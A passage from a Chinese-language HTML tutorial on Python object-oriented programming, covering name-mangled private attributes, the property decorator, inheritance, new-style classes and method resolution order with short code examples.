<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Student</span>:</span>
    <span class="hljs-keyword">pass</span>
</code></pre>
<h4 id="&#x5C01;&#x88C5;">&#x5C01;&#x88C5;</h4>
<pre><code class="lang-python"><span class="hljs-comment"># &#x5C01;&#x88C5;&#x662F;&#x9762;&#x5411;&#x5BF9;&#x8C61;&#x4E09;&#x5927;&#x7279;&#x6027;&#x6700;&#x6838;&#x5FC3;&#x7684;&#x4E00;&#x4E2A;&#x7279;&#x6027;</span>
<span class="hljs-comment"># &#x5C01;&#x88C5;&lt;-&gt;&#x6574;&#x5408;</span>

<span class="hljs-comment"># 1&#x3001;&#x5982;&#x4F55;&#x9690;&#x85CF;&#xFF1A;&#x5728;&#x5C5E;&#x6027;&#x540D;&#x524D;&#x52A0;__&#x524D;&#x7F00;,&#x5C31;&#x4F1A;&#x5B9E;&#x73B0;&#x4E00;&#x4E2A;&#x5BF9;&#x5916;&#x9690;&#x85CF;&#x5C5E;&#x6027;&#x6548;&#x679C;</span>
</code></pre>
<h5 id="&#x9690;&#x85CF;&#x5C5E;&#x6027;">&#x9690;&#x85CF;&#x5C5E;&#x6027;</h5>
<pre><code class="lang-python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Foo</span>:</span> 
      __x = <span class="hljs-number">1</span>  <span class="hljs-comment"># _Foo__x</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__f1</span><span class="hljs-params">(self)</span>:</span>  <span class="hljs-comment"># _Foo__f1</span>
        print(<span class="hljs-string">&apos;from test&apos;</span>)
</code></pre>
<pre><code class="lang-python"><span class="hljs-comment"># I:&#x5728;&#x7C7B;&#x5916;&#x90E8;&#x65E0;&#x6CD5;&#x76F4;&#x63A5;&#x8BBF;&#x95EE;&#x53CC;&#x4E0B;&#x6ED1;&#x7EBF;&#x5F00;&#x5934;&#x7684;&#x5C5E;&#x6027;&#xFF0C;&#x4F46;&#x77E5;&#x9053;&#x4E86;&#x7C7B;&#x540D;&#x548C;&#x5C5E;&#x6027;&#x540D;&#x5C31;&#x53EF;&#x4EE5;&#x62FC;&#x51FA;&#x540D;&#x5B57;&#xFF1A;_&#x7C7B;&#x540D;__&#x5C5E;&#x6027;&#xFF0C;&#x7136;&#x540E;&#x5C31;&#x53EF;&#x4EE5;&#x8BBF;&#x95EE;&#x4E86;&#xFF0C;&#x5982;Foo._A__N&#xFF0C;</span>
<span class="hljs-comment"># &#x6240;&#x4EE5;&#x8BF4;&#x8FD9;&#x79CD;&#x64CD;&#x4F5C;&#x5E76;&#x6CA1;&#x6709;&#x4E25;&#x683C;&#x610F;&#x4E49;&#x4E0A;&#x5730;&#x9650;&#x5236;&#x5916;&#x90E8;&#x8BBF;&#x95EE;&#xFF0C;&#x4EC5;&#x4EC5;&#x53EA;&#x662F;&#x4E00;&#x79CD;&#x8BED;&#x6CD5;&#x610F;&#x4E49;&#x4E0A;&#x7684;&#x53D8;&#x5F62;</span>
</code></pre>
<pre><code class="lang-python">II&#xFF1A;&#x8FD9;&#x79CD;&#x9690;&#x85CF;&#x5BF9;&#x5916;&#x4E0D;&#x5BF9;&#x5185;,&#x56E0;&#x4E3A;__&#x5F00;&#x5934;&#x7684;&#x5C5E;&#x6027;&#x4F1A;&#x5728;&#x68C0;&#x67E5;&#x7C7B;&#x4F53;&#x4EE3;&#x7801;&#x8BED;&#x6CD5;&#x65F6;&#x7EDF;&#x4E00;&#x53D1;&#x751F;&#x53D8;&#x5F62;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Foo</span>:</span>
    __x = <span class="hljs-number">1</span>  <span class="hljs-comment"># _Foo__x = 1</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__f1</span><span class="hljs-params">(self)</span>:</span>  <span class="hljs-comment"># _Foo__f1</span>
        print(<span class="hljs-string">&apos;from test&apos;</span>)

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">f2</span><span class="hljs-params">(self)</span>:</span>
        print(self.__x) <span class="hljs-comment"># print(self._Foo__x)</span>
        print(self.__f1) <span class="hljs-comment"># print(self._Foo__f1)</span>

print(Foo.__x)
print(Foo.__f1)
obj=Foo()
obj.f2()
</code></pre>
<pre><code class="lang-python"><span class="hljs-comment"># III: &#x8FD9;&#x79CD;&#x53D8;&#x5F62;&#x64CD;&#x4F5C;&#x53EA;&#x5728;&#x68C0;&#x67E5;&#x7C7B;&#x4F53;&#x8BED;&#x6CD5;&#x7684;&#x65F6;&#x5019;&#x53D1;&#x751F;&#x4E00;&#x6B21;&#xFF0C;&#x4E4B;&#x540E;&#x5B9A;&#x4E49;&#x7684;__&#x5F00;&#x5934;&#x7684;&#x5C5E;&#x6027;&#x90FD;&#x4E0D;&#x4F1A;&#x53D8;&#x5F62;</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Foo</span>:</span>
    __x = <span class="hljs-number">1</span>  <span class="hljs-comment"># _Foo__x = 1</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__f1</span><span class="hljs-params">(self)</span>:</span>  <span class="hljs-comment"># _Foo__f1</span>
        print(<span class="hljs-string">&apos;from test&apos;</span>)

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">f2</span><span class="hljs-params">(self)</span>:</span>
        print(self.__x) <span class="hljs-comment"># print(self._Foo__x)</span>
        print(self.__f1) <span class="hljs-comment"># print(self._Foo__f1)</span>

Foo.__y=<span class="hljs-number">3</span>
print(Foo.__dict__)
print(Foo.__y)
</code></pre>
<pre><code class="lang-python"><span class="hljs-comment"># 2&#x3001;&#x4E3A;&#x4F55;&#x8981;&#x9690;&#x85CF;&#xFF1F;</span>
<span class="hljs-comment"># I&#x3001;&#x9690;&#x85CF;&#x6570;&#x636E;&#x5C5E;&#x6027;&quot;&#x5C06;&#x6570;&#x636E;&#x9690;&#x85CF;&#x8D77;&#x6765;&#x5C31;&#x9650;&#x5236;&#x4E86;&#x7C7B;&#x5916;&#x90E8;&#x5BF9;&#x6570;&#x636E;&#x7684;&#x76F4;&#x63A5;&#x64CD;&#x4F5C;&#xFF0C;&#x7136;&#x540E;&#x7C7B;&#x5185;&#x5E94;&#x8BE5;&#x63D0;&#x4F9B;&#x76F8;&#x5E94;&#x7684;&#x63A5;&#x53E3;&#x6765;&#x5141;&#x8BB8;&#x7C7B;&#x5916;&#x90E8;&#x95F4;&#x63A5;&#x5730;&#x64CD;&#x4F5C;&#x6570;&#x636E;&#xFF0C;&#x63A5;&#x53E3;&#x4E4B;&#x4E0A;&#x53EF;&#x4EE5;&#x9644;&#x52A0;&#x989D;&#x5916;&#x7684;&#x903B;&#x8F91;&#x6765;&#x5BF9;&#x6570;&#x636E;&#x7684;&#x64CD;&#x4F5C;&#x8FDB;&#x884C;&#x4E25;&#x683C;&#x5730;&#x63A7;&#x5236;&#xFF1A;</span>
</code></pre>
<h5 id="property">property</h5>
<pre><code class="lang-python"><span class="hljs-comment"># &#x88C5;&#x9970;&#x5668;&#x662F;&#x5728;&#x4E0D;&#x4FEE;&#x6539;&#x88AB;&#x88C5;&#x9970;&#x5BF9;&#x8C61;&#x6E90;&#x4EE3;&#x7801;&#x4EE5;&#x53CA;&#x8C03;&#x7528;&#x65B9;&#x5F0F;&#x7684;&#x524D;&#x63D0;&#x4E0B;&#x4E3A;&#x88AB;&#x88C5;&#x9970;&#x5BF9;&#x8C61;&#x6DFB;&#x52A0;</span>
<span class="hljs-comment"># &#x65B0;&#x529F;&#x80FD;&#x7684;&#x53EF;&#x8C03;&#x7528;&#x5BF9;&#x8C61;</span>
<span class="hljs-comment"># print(property)</span>

<span class="hljs-comment"># property&#x662F;&#x4E00;&#x4E2A;&#x88C5;&#x9970;&#x5668;&#xFF0C;&#x662F;&#x7528;&#x6765;&#x7ED1;&#x5B9A;&#x7ED9;&#x5BF9;&#x8C61;&#x7684;&#x65B9;&#x6CD5;&#x4F2A;&#x9020;&#x6210;&#x4E00;&#x4E2A;&#x6570;&#x636E;&#x5C5E;&#x6027;</span>

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">People</span>:</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self, name, weight, height)</span>:</span>
        self.name = name
        self.weight = weight
        self.height = height

    <span class="hljs-comment"># &#x5B9A;&#x4E49;&#x51FD;&#x6570;&#x7684;&#x539F;&#x56E0;1&#xFF1A;</span>
    <span class="hljs-comment"># 1&#x3001;&#x4ECE;bmi&#x7684;&#x516C;&#x5F0F;&#x4E0A;&#x770B;&#xFF0C;bmi&#x5E94;&#x8BE5;&#x662F;&#x89E6;&#x53D1;&#x529F;&#x80FD;&#x8BA1;&#x7B97;&#x5F97;&#x5230;&#x7684;</span>
    <span class="hljs-comment"># 2&#x3001;bmi&#x662F;&#x968F;&#x7740;&#x8EAB;&#x9AD8;&#x3001;&#x4F53;&#x91CD;&#x7684;&#x53D8;&#x5316;&#x800C;&#x52A8;&#x6001;&#x53D8;&#x5316;&#x7684;&#xFF0C;&#x4E0D;&#x662F;&#x4E00;&#x4E2A;&#x56FA;&#x5B9A;&#x7684;&#x503C;</span>
    <span class="hljs-comment">#    &#x8BF4;&#x767D;&#x4E86;&#xFF0C;&#x6BCF;&#x6B21;&#x90FD;&#x662F;&#x9700;&#x8981;&#x4E34;&#x65F6;&#x8BA1;&#x7B97;&#x5F97;&#x5230;&#x7684;</span>

    <span class="hljs-comment"># &#x4F46;&#x662F;bmi&#x542C;&#x8D77;&#x6765;&#x66F4;&#x50CF;&#x662F;&#x4E00;&#x4E2A;&#x6570;&#x636E;&#x5C5E;&#x6027;&#xFF0C;&#x800C;&#x975E;&#x529F;&#x80FD;</span>
<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">bmi</span><span class="hljs-params">(self)</span>:</span>
        <span class="hljs-keyword">return</span> self.weight / (self.height ** <span class="hljs-number">2</span>)
</code></pre>
<pre><code class="lang-python">~~~



<span class="hljs-comment">#### &#x7EE7;&#x627F;</span>

~~~python
<span class="hljs-comment"># 1&#x3001;&#x4EC0;&#x4E48;&#x662F;&#x7EE7;&#x627F;</span>
<span class="hljs-comment"># I:&#x7EE7;&#x627F;&#x662F;&#x4E00;&#x79CD;&#x521B;&#x5EFA;&#x65B0;&#x7C7B;&#x7684;&#x65B9;&#x5F0F;&#xFF0C;&#x65B0;&#x5EFA;&#x7684;&#x7C7B;&#x53EF;&#x79F0;&#x4E3A;&#x5B50;&#x7C7B;&#x6216;&#x6D3E;&#x751F;&#x7C7B;&#xFF0C;&#x7236;&#x7C7B;&#x53C8;&#x53EF;&#x79F0;&#x4E3A;&#x57FA;&#x7C7B;&#x6216;&#x8D85;&#x7C7B;,&#x5B50;&#x7C7B;&#x4F1A;&#x9057;&#x4F20;&#x7236;&#x7C7B;&#x7684;&#x5C5E;&#x6027;</span>
<span class="hljs-comment"># II:&#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x662F;&#xFF1A;python&#x652F;&#x6301;&#x591A;&#x7EE7;&#x627F;</span>
<span class="hljs-comment">#          &#x5728;Python&#x4E2D;&#xFF0C;&#x65B0;&#x5EFA;&#x7684;&#x7C7B;&#x53EF;&#x4EE5;&#x7EE7;&#x627F;&#x4E00;&#x4E2A;&#x6216;&#x591A;&#x4E2A;&#x7236;&#x7C7B;</span>

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Parent1</span><span class="hljs-params">(object)</span>:</span>
    x=<span class="hljs-number">1111</span>

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Parent2</span><span class="hljs-params">(object)</span>:</span>
    <span class="hljs-keyword">pass</span>

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Sub1</span><span class="hljs-params">(Parent1)</span>:</span> <span class="hljs-comment"># &#x5355;&#x7EE7;&#x627F;</span>
    <span class="hljs-keyword">pass</span>

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Sub2</span><span class="hljs-params">(Parent1,Parent2)</span>:</span> <span class="hljs-comment"># &#x591A;&#x7EE7;&#x627F;</span>
    <span class="hljs-keyword">pass</span>

print(Sub1.__bases__)
print(Sub2.__bases__)

print(Sub1.x)
</code></pre>
<h5 id="&#x65B0;&#x5F0F;&#x7C7B;&#x548C;&#x7ECF;&#x5178;&#x7C7B;">&#x65B0;&#x5F0F;&#x7C7B;&#x548C;&#x7ECF;&#x5178;&#x7C7B;</h5>
<pre><code class="lang-python"><span class="hljs-comment"># ps1: &#x5728;python2&#x4E2D;&#x6709;&#x7ECF;&#x5178;&#x7C7B;&#x4E0E;&#x65B0;&#x5F0F;&#x7C7B;&#x4E4B;&#x5206;</span>
<span class="hljs-comment"># &#x65B0;&#x5F0F;&#x7C7B;&#xFF1A;&#x7EE7;&#x627F;&#x4E86;object&#x7C7B;&#x7684;&#x5B50;&#x7C7B;&#xFF0C;&#x4EE5;&#x53CA;&#x8BE5;&#x5B50;&#x7C7B;&#x7684;&#x5B50;&#x7C7B;&#x5B50;&#x5B50;&#x7C7B;&#x3002;&#x3002;&#x3002;</span>
<span class="hljs-comment"># &#x7ECF;&#x5178;&#x7C7B;&#xFF1A;&#x6CA1;&#x6709;&#x7EE7;&#x627F;object&#x7C7B;&#x7684;&#x5B50;&#x7C7B;&#xFF0C;&#x4EE5;&#x53CA;&#x8BE5;&#x5B50;&#x7C7B;&#x7684;&#x5B50;&#x7C7B;&#x5B50;&#x5B50;&#x7C7B;&#x3002;&#x3002;&#x3002;</span>

<span class="hljs-comment"># ps2:&#x5728;python3&#x4E2D;&#x6CA1;&#x6709;&#x7EE7;&#x627F;&#x4EFB;&#x4F55;&#x7C7B;&#xFF0C;&#x90A3;&#x4E48;&#x4F1A;&#x9ED8;&#x8BA4;&#x7EE7;&#x627F;object&#x7C7B;&#xFF0C;&#x6240;&#x4EE5;python3&#x4E2D;&#x6240;&#x6709;&#x7684;&#x7C7B;&#x90FD;&#x662F;&#x65B0;&#x5F0F;&#x7C7B;</span>
<span class="hljs-comment"># print(Parent1.__bases__)</span>
<span class="hljs-comment"># print(Parent2.__bases__)</span>

<span class="hljs-comment"># III:python&#x7684;&#x591A;&#x7EE7;&#x627F;</span>
<span class="hljs-comment">#     &#x4F18;&#x70B9;&#xFF1A;&#x5B50;&#x7C7B;&#x53EF;&#x4EE5;&#x540C;&#x65F6;&#x9057;&#x4F20;&#x591A;&#x4E2A;&#x7236;&#x7C7B;&#x7684;&#x5C5E;&#x6027;&#xFF0C;&#x6700;&#x5927;&#x9650;&#x5EA6;&#x5730;&#x91CD;&#x7528;&#x4EE3;&#x7801;</span>
<span class="hljs-comment">#     &#x7F3A;&#x70B9;&#xFF1A;</span>
<span class="hljs-comment">#         1&#x3001;&#x8FDD;&#x80CC;&#x4EBA;&#x7684;&#x601D;&#x7EF4;&#x4E60;&#x60EF;&#xFF1A;&#x7EE7;&#x627F;&#x8868;&#x8FBE;&#x7684;&#x662F;&#x4E00;&#x79CD;&#x4EC0;&#x4E48;&quot;&#x662F;&quot;&#x4EC0;&#x4E48;&#x7684;&#x5173;&#x7CFB;</span>
<span class="hljs-comment">#         2&#x3001;&#x4EE3;&#x7801;&#x53EF;&#x8BFB;&#x6027;&#x4F1A;&#x53D8;&#x5DEE;</span>
<span class="hljs-comment">#         3&#x3001;&#x4E0D;&#x5EFA;&#x8BAE;&#x4F7F;&#x7528;&#x591A;&#x7EE7;&#x627F;&#xFF0C;&#x6709;&#x53EF;&#x80FD;&#x4F1A;&#x5F15;&#x53D1;&#x53EF;&#x6076;&#x7684;&#x83F1;&#x5F62;&#x95EE;&#x9898;&#xFF0C;&#x6269;&#x5C55;&#x6027;&#x53D8;&#x5DEE;&#xFF0C;</span>
<span class="hljs-comment">#         &#x5982;&#x679C;&#x771F;&#x7684;&#x6D89;&#x53CA;&#x5230;&#x4E00;&#x4E2A;&#x5B50;&#x7C7B;&#x4E0D;&#x53EF;&#x907F;&#x514D;&#x5730;&#x8981;&#x91CD;&#x7528;&#x591A;&#x4E2A;&#x7236;&#x7C7B;&#x7684;&#x5C5E;&#x6027;&#xFF0C;&#x5E94;&#x8BE5;&#x4F7F;&#x7528;Mixins</span>

<span class="hljs-comment"># 2&#x3001;&#x4E3A;&#x4F55;&#x8981;&#x7528;&#x7EE7;&#x627F;&#xFF1A;&#x7528;&#x6765;&#x89E3;&#x51B3;&#x7C7B;&#x4E0E;&#x7C7B;&#x4E4B;&#x95F4;&#x4EE3;&#x7801;&#x5197;&#x4F59;&#x95EE;&#x9898;</span>

<span class="hljs-comment"># 3&#x3001;&#x5982;&#x4F55;&#x5B9E;&#x73B0;&#x7EE7;&#x627F;</span>
<span class="hljs-comment"># # &#x793A;&#x8303;1&#xFF1A;&#x7C7B;&#x4E0E;&#x7C7B;&#x4E4B;&#x95F4;&#x5B58;&#x5728;&#x5197;&#x4F59;&#x95EE;&#x9898;</span>

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">OldboyPeople</span>:</span>
    school = <span class="hljs-string">&apos;OLDBOY&apos;</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self, name, age, sex)</span>:</span>
        self.name = name
        self.age = age
        self.sex = sex


<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Student</span><span class="hljs-params">(OldboyPeople)</span>:</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">choose_course</span><span class="hljs-params">(self)</span>:</span>
        print(<span class="hljs-string">&apos;&#x5B66;&#x751F;%s &#x6B63;&#x5728;&#x9009;&#x8BFE;&apos;</span> % self.name)
<span class="hljs-comment"># stu_obj = Student(&apos;lili&apos;, 18, &apos;female&apos;)</span>
<span class="hljs-comment"># print(stu_obj.__dict__)</span>
<span class="hljs-comment"># print(stu_obj.school)</span>
<span class="hljs-comment"># stu_obj.choose_course()</span>


<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Teacher</span><span class="hljs-params">(OldboyPeople)</span>:</span>
    <span class="hljs-comment">#           &#x8001;&#x5E08;&#x7684;&#x7A7A;&#x5BF9;&#x8C61;&#xFF0C;&apos;egon&apos;,18,&apos;male&apos;,3000,10</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self, name, age, sex, salary, level)</span>:</span>
        <span class="hljs-comment"># &#x6307;&#x540D;&#x9053;&#x59D3;&#x5730;&#x8DDF;&#x7236;&#x7C7B;OldboyPeople&#x53BB;&#x8981;__init__</span>
        OldboyPeople.__init__(self,name,age, sex)
        self.salary = salary
        self.level = level

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">score</span><span class="hljs-params">(self)</span>:</span>
        print(<span class="hljs-string">&apos;&#x8001;&#x5E08; %s &#x6B63;&#x5728;&#x7ED9;&#x5B66;&#x751F;&#x6253;&#x5206;&apos;</span> % self.name)

tea_obj=Teacher(<span class="hljs-string">&apos;egon&apos;</span>,<span class="hljs-number">18</span>,<span class="hljs-string">&apos;male&apos;</span>,<span class="hljs-number">3000</span>,<span class="hljs-number">10</span>)
<span class="hljs-comment"># print(tea_obj.__dict__)</span>
<span class="hljs-comment"># print(tea_obj.school)</span>

tea_obj.score()
</code></pre>
<p><a href="https://imgtu.com/i/bR8qIJ" target="_blank"><img src="https://s1.ax1x.com/2022/03/09/bR8qIJ.png" alt="bR8qIJ.png"></a></p>
<h5 id="&#x5355;&#x7EE7;&#x627F;&#x80CC;&#x666F;&#x4E0B;&#x7684;&#x5C5E;&#x6027;&#x67E5;&#x627E;">&#x5355;&#x7EE7;&#x627F;&#x80CC;&#x666F;&#x4E0B;&#x7684;&#x5C5E;&#x6027;&#x67E5;&#x627E;</h5>
<pre><code class="lang-python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Foo</span>:</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">f1</span><span class="hljs-params">(self)</span>:</span>
        print(<span class="hljs-string">&apos;Foo.f1&apos;</span>)

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">f2</span><span class="hljs-params">(self)</span>:</span>
        print(<span class="hljs-string">&apos;Foo.f2&apos;</span>)
        self.f1() <span class="hljs-comment"># obj.f1()</span>

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Bar</span><span class="hljs-params">(Foo)</span>:</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">f1</span><span class="hljs-params">(self)</span>:</span>
        print(<span class="hljs-string">&apos;Bar.f1&apos;</span>)

obj=Bar()
obj.f2()
---------------------------------------
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Foo</span>:</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">f1</span><span class="hljs-params">(self)</span>:</span>
        print(<span class="hljs-string">&apos;Foo.f1&apos;</span>)

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">f2</span><span class="hljs-params">(self)</span>:</span>
        print(<span class="hljs-string">&apos;Foo.f2&apos;</span>)
        Foo.f1(self) <span class="hljs-comment"># &#x8C03;&#x7528;&#x5F53;&#x524D;&#x7C7B;&#x4E2D;&#x7684;f1</span>

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Bar</span><span class="hljs-params">(Foo)</span>:</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">f1</span><span class="hljs-params">(self)</span>:</span>
        print(<span class="hljs-string">&apos;Bar.f1&apos;</span>)

obj=Bar()
obj.f2()
-----------------------------------------
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Foo</span>:</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__f1</span><span class="hljs-params">(self)</span>:</span> <span class="hljs-comment"># _Foo__f1</span>
        print(<span class="hljs-string">&apos;Foo.f1&apos;</span>)

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">f2</span><span class="hljs-params">(self)</span>:</span>
        print(<span class="hljs-string">&apos;Foo.f2&apos;</span>)
        self.__f1() <span class="hljs-comment"># self._Foo__f1,# &#x8C03;&#x7528;&#x5F53;&#x524D;&#x7C7B;&#x4E2D;&#x7684;f1</span>

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Bar</span><span class="hljs-params">(Foo)</span>:</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__f1</span><span class="hljs-params">(self)</span>:</span> <span class="hljs-comment"># _Bar__f1</span>
        print(<span class="hljs-string">&apos;Bar.f1&apos;</span>)

obj=Bar()
obj.f2()
</code></pre>
<h4 id="&#x83F1;&#x5F62;&#x95EE;&#x9898;-mro">&#x83F1;&#x5F62;&#x95EE;&#x9898;-MRO</h4>
<p><a href="https://imgse.com/i/p9MLOfA" target="_blank"><img src="https://s1.ax1x.com/2023/04/27/p9MLOfA.png" alt="p9MLOfA.png"></a></p>
<p>&#x5BF9;&#x4E8E;&#x4F60;&#x5B9A;&#x4E49;&#x7684;&#x6BCF;&#x4E00;&#x4E2A;&#x7C7B;&#xFF0C;Python&#x90FD;&#x4F1A;&#x8BA1;&#x7B97;&#x51FA;&#x4E00;&#x4E2A;&#x65B9;&#x6CD5;&#x89E3;&#x6790;&#x987A;&#x5E8F;(MRO)&#x5217;&#x8868;&#xFF0C;&#x8BE5;MRO&#x5217;&#x8868;&#x5C31;&#x662F;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x6240;&#x6709;&#x57FA;&#x7C7B;&#x7684;&#x7EBF;&#x6027;&#x987A;&#x5E8F;&#x5217;&#x8868;&#xFF0C;&#x5982;&#x4E0B;</p>
<pre><code class="lang-python">&gt;&gt;&gt; D.mro() # &#x65B0;&#x5F0F;&#x7C7B;&#x5185;&#x7F6E;&#x4E86;mro&#x65B9;&#x6CD5;&#x53EF;&#x4EE5;&#x67E5;&#x770B;&#x7EBF;&#x6027;&#x5217;&#x8868;&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x7ECF;&#x5178;&#x7C7B;&#x6CA1;&#x6709;&#x8BE5;&#x5185;&#x7F6E;&#x8BE5;&#x65B9;&#x6CD5;
[&lt;class &apos;__main__.D&apos;&gt;, &lt;class &apos;__main__.B&apos;&gt;, &lt;class &apos;__main__.C&apos;&gt;, &lt;class &apos;__main__.A&apos;&gt;, &lt;class &apos;object&apos;&gt;]
</code></pre>
<p>python&#x4F1A;&#x5728;MRO&#x5217;&#x8868;&#x4E0A;&#x4ECE;&#x5DE6;&#x5230;&#x53F3;&#x5F00;&#x59CB;&#x67E5;&#x627E;&#x57FA;&#x7C7B;,&#x76F4;&#x5230;&#x627E;&#x5230;&#x7B2C;&#x4E00;&#x4E2A;&#x5339;&#x914D;&#x8FD9;&#x4E2A;&#x5C5E;&#x6027;&#x7684;&#x7C7B;&#x4E3A;&#x6B62;&#x3002; &#x800C;&#x8FD9;&#x4E2A;MRO&#x5217;&#x8868;&#x7684;&#x6784;&#x9020;&#x662F;&#x901A;&#x8FC7;&#x4E00;&#x4E2A;C3&#x7EBF;&#x6027;&#x5316;&#x7B97;&#x6CD5;&#x6765;&#x5B9E;&#x73B0;&#x7684;&#x3002;&#x6211;&#x4EEC;&#x4E0D;&#x53BB;&#x6DF1;&#x7A76;&#x8FD9;&#x4E2A;&#x7B97;&#x6CD5;&#x7684;&#x6570;&#x5B66;&#x539F;&#x7406;,&#x5B83;&#x5B9E;&#x9645;&#x4E0A;&#x5C31;&#x662F;&#x5408;&#x5E76;&#x6240;&#x6709;&#x7236;&#x7C7B;&#x7684;MRO&#x5217;&#x8868;&#x5E76;&#x9075;&#x5FAA;&#x5982;&#x4E0B;&#x4E09;&#x6761;&#x51C6;&#x5219;</p>
<pre><code class="lang-python"><span class="hljs-number">1.</span>&#x5B50;&#x7C7B;&#x4F1A;&#x5148;&#x4E8E;&#x7236;&#x7C7B;&#x88AB;&#x68C0;&#x67E5;
<span class="hljs-number">2.</span>&#x591A;&#x4E2A;&#x7236;&#x7C7B;&#x4F1A;&#x6839;&#x636E;&#x5B83;&#x4EEC;&#x5728;&#x5217;&#x8868;&#x4E2D;&#x7684;&#x987A;&#x5E8F;&#x88AB;&#x68C0;&#x67E5;
<span class="hljs-number">3.</span>&#x5982;&#x679C;&#x5BF9;&#x4E0B;&#x4E00;&#x4E2A;&#x7C7B;&#x5B58;&#x5728;&#x4E24;&#x4E2A;&#x5408;&#x6CD5;&#x7684;&#x9009;&#x62E9;,&#x9009;&#x62E9;&#x7B2C;&#x4E00;&#x4E2A;&#x7236;&#x7C7B;
</code></pre>
<pre><code class="lang-python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span><span class="hljs-params">(object)</span>:</span>
    <span class="hljs-comment"># def test(self):</span>
    <span class="hljs-comment">#     print(&apos;from A&apos;)</span>
    <span class="hljs-keyword">pass</span>

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span><span class="hljs-params">(A)</span>:</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span><span class="hljs-params">(self)</span>:</span>
        print(<span class="hljs-string">&apos;from B&apos;</span>)
    <span class="hljs-keyword">pass</span>

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span><span class="hljs-params">(A)</span>:</span>
    <span class="hljs-comment"># def test(self):</span>
    <span class="hljs-comment">#     print(&apos;from C&apos;)</span>
    <span class="hljs-keyword">pass</span>

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">D</span><span class="hljs-params">(C,B)</span>:</span>
    <span class="hljs-comment"># def test(self):</span>
    <span class="hljs-comment">#     print(&apos;from D&apos;)</span>
    <span class="hljs-keyword">pass</span>

print(D.mro()) <span class="hljs-comment"># &#x7C7B;D&#x4EE5;&#x53CA;&#x7C7B;D&#x7684;&#x5BF9;&#x8C61;&#x8BBF;&#x95EE;&#x5C5E;&#x6027;&#x90FD;&#x662F;&#x53C2;&#x7167;&#x8BE5;&#x7C7B;&#x7684;mro&#x5217;&#x8868;</span>

<span class="hljs-comment"># print(C.mro()) # &#x7C7B;C&#x4EE5;&#x53CA;&#x7C7B;C&#x7684;&#x5BF9;&#x8C61;&#x8BBF;&#x95EE;&#x5C5E;&#x6027;&#x90FD;&#x662F;&#x53C2;&#x7167;&#x8BE5;&#x7C7B;&#x7684;mro&#x5217;&#x8868;</span>
<span class="hljs-comment"># c=C()</span>
<span class="hljs-comment"># c.test()</span>

<span class="hljs-comment"># &#x603B;&#x7ED3;&#xFF1A;&#x7C7B;&#x76F8;&#x5173;&#x7684;&#x5C5E;&#x6027;&#x67E5;&#x627E;&#xFF08;&#x7C7B;&#x540D;.&#x5C5E;&#x6027;&#xFF0C;&#x8BE5;&#x7C7B;&#x7684;&#x5BF9;&#x8C61;.&#x5C5E;&#x6027;&#xFF09;&#xFF0C;&#x90FD;&#x662F;&#x53C2;&#x7167;&#x8BE5;&#x7C7B;&#x7684;mro</span>

